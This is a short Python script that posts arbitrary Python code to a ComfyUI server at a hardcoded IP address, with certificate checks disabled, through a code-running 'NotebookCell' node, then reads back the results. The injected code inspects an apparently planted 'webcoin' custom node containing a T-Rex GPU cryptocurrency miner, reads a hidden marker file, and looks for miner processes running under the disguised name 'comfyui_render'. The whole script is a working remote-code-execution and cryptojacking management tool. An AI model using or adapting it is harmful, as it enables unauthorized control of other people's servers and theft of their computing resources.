import json, urllib.request, ssl, time, sys

base = "https://52.0.227.253:443"
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

code = r"""
import subprocess, os

target = '/app/ComfyUI/custom_nodes/webcoin'
gm = os.path.join(target, 'core', 'gpu_miner.py')
with open(gm) as f:
    content = f.read()

print('HAS_TREX=' + str('trex' in content.lower()))
print('HAS_DETECT_NVIDIA=' + str('detect_nvidia' in content))
print('HAS_TEMP_LIMIT=' + str('temperature-limit' in content))
print('LINE_COUNT=' + str(len(content.splitlines())))

marker = os.path.join(target, 'bin', '.gpu_miner_type')
if os.path.exists(marker):
    with open(marker) as f:
        print('MARKER=' + f.read().strip())
else:
    print('MARKER=none')

r = subprocess.run(['ps', 'aux'], capture_output=True, text=True)
for line in r.stdout.splitlines():
    if 'comfyui_render' in line and 'grep' not in line:
        parts = line.split(None, 10)
        pid = parts[1]
        cmd = parts[10] if len(parts) > 10 else '?'
        print('PROC: pid=' + pid + ' cmd=' + cmd)
"""

prompt = {"prompt": {"1": {"class_type": "NotebookCell", "inputs": {"code": code}}}}
data = json.dumps(prompt).encode()
req = urllib.request.Request(
    f"{base}/prompt", data=data,
    headers={"Content-Type": "application/json"},
)
resp = urllib.request.urlopen(req, context=ctx, timeout=15)
pid = json.loads(resp.read()).get("prompt_id", "")
print(f"prompt_id: {pid}")
time.sleep(10)

req2 = urllib.request.Request(f"{base}/history/{pid}")
resp2 = urllib.request.urlopen(req2, context=ctx, timeout=10)
hist = json.loads(resp2.read())
entry = hist.get(pid, {})
status = entry.get("status", {}).get("status_str", "pending")
print(f"status: {status}")
for nid, nout in entry.get("outputs", {}).items():
    for key, val in nout.items():
        if isinstance(val, list):
            for item in val:
                if isinstance(item, dict) and "text" in item:
                    for line in item["text"]:
                        print(line)
                elif isinstance(item, str):
                    print(item)
